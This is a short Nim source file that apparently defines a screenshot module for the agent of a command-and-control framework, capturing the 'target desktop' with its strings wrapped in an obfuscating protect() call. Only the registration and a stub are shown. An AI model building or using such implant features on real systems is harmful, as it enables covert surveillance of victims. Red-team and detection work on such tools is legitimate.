import ../common/[types, utils]

# Define function prototype
proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let module* = Module(
    name: protect("screenshot"), 
    description: protect("Take and retrieve a screenshot of the target desktop."),
    moduleType: MODULE_SCREENSHOT,
    commands: @[
        Command(
            name: protect("screenshot"),
            commandType: CMD_SCREENSHOT,
            description: protect("Take a screenshot of the target system."),
            example: protect("screenshot"),
            arguments: @[],
            execute: executeScreenshot
        )
    ]
)

# Implement execution functions
when not defined(agent):
    proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = nil
